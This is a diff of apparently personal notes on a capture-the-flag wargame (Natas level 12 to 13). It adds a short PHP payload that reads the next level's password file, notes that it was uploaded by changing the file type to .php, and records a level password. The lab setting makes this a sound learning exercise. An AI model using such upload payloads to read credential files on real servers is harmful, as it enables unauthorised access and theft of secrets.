@@ -75,6 +75,10 @@ yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
 level 12-13
 HTTP trafic could be modified 
 php command was added to retrive the password
+<?php
+echo file_get_contents("/etc/natas_webpass/natas13");
+?>
+conerted inputed type into a .php 
 trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
 
 level 13-14
